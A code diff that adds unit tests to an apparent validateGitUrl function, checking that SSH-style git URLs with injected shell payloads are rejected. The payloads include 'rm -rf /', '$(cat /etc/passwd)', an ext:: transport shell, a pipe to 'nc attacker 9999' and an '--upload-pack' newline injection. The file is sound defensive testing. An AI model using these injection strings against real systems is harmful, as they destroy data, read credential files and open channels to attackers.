@@ -565,6 +565,54 @@ spec:
         validateGitUrl("git@192.168.1.1:org/repo.git"),
       ).not.toThrow();
     });
+
+    it("should throw BadRequestException for an SSH-style URL with a semicolon in the path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/repo;rm -rf /"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should throw BadRequestException for an SSH-style URL with backticks in the path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/repo`id`"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should throw BadRequestException for an SSH-style URL with $() in the path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/$(cat /etc/passwd)"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should throw BadRequestException for an SSH-style URL with ext:: transport injection", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:ext::sh -c 'malicious'"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should throw BadRequestException for an SSH-style URL with a pipe in the path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/repo|nc attacker 9999"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should throw BadRequestException for an SSH-style URL with a newline in the path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/repo\n--upload-pack=evil"),
+      ).toThrow(BadRequestException);
+    });
+
+    it("should still allow a valid SSH-style URL with a deep path", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:org/team/repo.git"),
+      ).not.toThrow();
+    });
+
+    it("should still allow a valid SSH-style URL with tildes and dots", () => {
+      expect(() =>
+        validateGitUrl("git@github.com:~user/repo.test.git"),
+      ).not.toThrow();
+    });
   });
 
   describe("discoverFromLocation — error branches", () => {
